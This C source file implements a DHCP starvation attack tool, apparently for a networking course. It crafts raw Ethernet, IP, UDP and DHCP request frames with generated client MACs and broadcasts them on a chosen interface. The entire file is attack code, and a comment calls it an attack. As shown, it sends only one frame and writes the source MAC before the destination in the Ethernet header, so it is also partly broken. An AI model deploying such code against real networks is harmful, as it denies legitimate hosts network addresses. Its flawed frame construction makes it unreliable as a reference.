#include "pds-dhcpstarve.h"

void help() {
  printf("HELP\n");
}

/**
* Eror message wrapper
*/
void err(string msg, int erno, short show_help){
  perror( msg.c_str());
  if (show_help) help();
  exit(erno);
}

/**
* Universal function for memory allocation checking
**/
void check_null(void * lel){
  if (lel == NULL) err("Memory allocation failure", ERR, 0);
}

/**
* Check argument, if correct return interface name right away
*/
char* checkArgs(int argc, char **argv) {
  if ((argc != 3 ) || (strcmp(argv[1], "-i") != 0)) {
    err("Wrong arguments", 1, 0);
  }
  return argv[2];
}

/**
* Handle the process of generating MAC adresses
*/
void increment_mac_addr (uint8_t *addr ){
  for (int i = MAC_ADDR_MAX_INDEX; i > -1; i--) {
    if (addr[i] != MAX_OCTET_HEX) { // 0xff aka 255
      addr[i]++;
      return;
    }
  }
  for (size_t i = 0; i < ETH_ALEN; i++) {
    addr[i] = 0;
  }
  addr[MAC_ADDR_MAX_INDEX] = 1;
}

/**
* Create in_addr* from string(char *) for ip header
*/
struct in_addr* str_to_ip(const char* addr){
  struct in_addr* tmp_addr = (struct in_addr*) malloc(sizeof(struct in_addr));
  check_null(tmp_addr);

  int e;
  if ((e = inet_pton(AF_INET, addr, tmp_addr)) != 1) {
    err("inet_pton: Failed to convert ip adr", e, 0);
  }
  return tmp_addr;
}

/**
* Create, allocate and fill necessary values to ip header
**/
struct ip* get_ip_header(){
  struct ip* hdr = (struct ip*)malloc(sizeof(struct ip));
  check_null(hdr);

  hdr->ip_hl = 5;           // 5 bytes
  hdr->ip_v = 4;            // version 4
  hdr->ip_tos = 0;          // best effort
  hdr->ip_off = 0;          // no fragmentation
  hdr->ip_id = htons(9999); // random blob
  hdr->ip_ttl = 255;        // 255, why not it's an attack
  hdr->ip_p = IPPROTO_UDP;  // udp, RFC constant
  hdr->ip_src = *str_to_ip(IP4_SRC_ADDR);        //Fill in ip addresses
  hdr->ip_dst = *str_to_ip(IP4_BROADCAST);
  hdr->ip_len = htons(DHCP_BUFFER_SIZE + IP4_HEADER_LEN + UDP_HEADER_LEN);
  hdr->ip_sum = 0;          // hack, checksum should be disabled
  return hdr;
}

/**
* Allocate and fill udp header
*/
struct udphdr* get_udp_header(){
  struct udphdr* udp_header = (struct udphdr*)malloc(sizeof(struct udphdr));
  check_null(udp_header);

  udp_header->source = htons(DHCP_CLIENT_PORT); // Fill ports
  udp_header->dest = htons(DHCP_SERVER_PORT);
  udp_header->check = 0 ; // checksum is not compulsory for udp in ip_v4
  udp_header->len = htons(DHCP_BUFFER_SIZE + UDP_HEADER_LEN);
  return udp_header;
}


int main(int argc, char** argv) {
  char* interface_name = checkArgs(argc, argv); // get name of the interface
  srand(time(NULL));
  int sd = 0;
  if ((sd = socket (PF_PACKET, SOCK_RAW, IPPROTO_RAW)) < 0) {
    err ("Failed to create socket", sd, 0);
  }
  uint8_t src_mac_addr[MAC_ADDR_LEN];  // initiate src mac adress
  uint8_t dst_mac_addr[MAC_ADDR_LEN];  // set dst mac for broadcast
  for (size_t i = 0; i < MAC_ADDR_LEN; i++) {
    dst_mac_addr[i] = MAX_OCTET_HEX;
    src_mac_addr[i] = MIN_OCTET_HEX;
  }
  increment_mac_addr(src_mac_addr);

  struct sockaddr_ll interface;
  if ((interface.sll_ifindex = if_nametoindex (interface_name)) == 0) {
    err("if_nametoindex failed, wrong network interface name ?", ERR, 0);
  }
  // setup interface, see "man packet"
  interface.sll_family = AF_PACKET;
  memcpy(interface.sll_addr, src_mac_addr, MAC_ADDR_LEN * sizeof(uint8_t));
  interface.sll_halen = ETH_ALEN;
  interface.sll_pkttype = PACKET_BROADCAST; // Use broadcast packet
  interface.sll_protocol = ETH_P_802_3;

  struct ip* ip_header = get_ip_header();
  struct udphdr* udp_header = get_udp_header();

  unsigned char buffer[DHCP_BUFFER_SIZE];

  // fill the buffer with zeros and fill only relevant values
  bzero(buffer, sizeof(buffer));
  buffer[0] = (int) 1;      // Request 1
  buffer[1] = (int) 1;      // Ethernet
  buffer[2] = (int) MAC_ADDR_LEN; // Skip hops
  buffer[4] = (int) rand(); // transaction xid, always different
  buffer[5] = (int) rand();
  buffer[6] = (int) rand();
  buffer[7] = (int) rand(); // xid end, skip 4 octets of ip addreses
  buffer[28] = (int) src_mac_addr[0]; // fill client mac addr
  buffer[29] = (int) src_mac_addr[1];
  buffer[30] = (int) src_mac_addr[2];
  buffer[31] = (int) src_mac_addr[3];
  buffer[32] = (int) src_mac_addr[4];
  buffer[33] = (int) src_mac_addr[5]; // skip the rest
  buffer[34] = (int) 255;            //end

  int eth_msg_len = DHCP_BUFFER_SIZE + IP4_HEADER_LEN + UDP_HEADER_LEN + ETH_HEADER_LEN;
  unsigned char* eth_frame = (unsigned char*)malloc(eth_msg_len);
  check_null(eth_frame);

  memcpy(eth_frame, src_mac_addr, 6 * sizeof(uint8_t));
  memcpy(eth_frame + 6, dst_mac_addr, 6 * sizeof(uint8_t));
  eth_frame[12] = 0x08; // ETH_P_IP value
  eth_frame[13] = 0x00;
  /* L2 ends here */
  memcpy(eth_frame + ETH_HEADER_LEN, ip_header, IP4_HEADER_LEN * sizeof(uint8_t));
  memcpy(eth_frame + ETH_HEADER_LEN + IP4_HEADER_LEN, udp_header, UDP_HEADER_LEN * sizeof(uint8_t));
  memcpy(eth_frame + ETH_HEADER_LEN + IP4_HEADER_LEN + UDP_HEADER_LEN, buffer, DHCP_BUFFER_SIZE * sizeof(uint8_t));

  int sent = 0;
  if ((sent = sendto (sd, eth_frame, eth_msg_len, 0, (struct sockaddr *) &interface, sizeof (interface))) <= 0) {
    err("sendto() failed", sent, 0);
  }
  if (close(sd) < 0) {
    err("Failed to close the socket", sd, 0);
  }
  free(udp_header);
  free(ip_header);
  free(eth_frame);
}
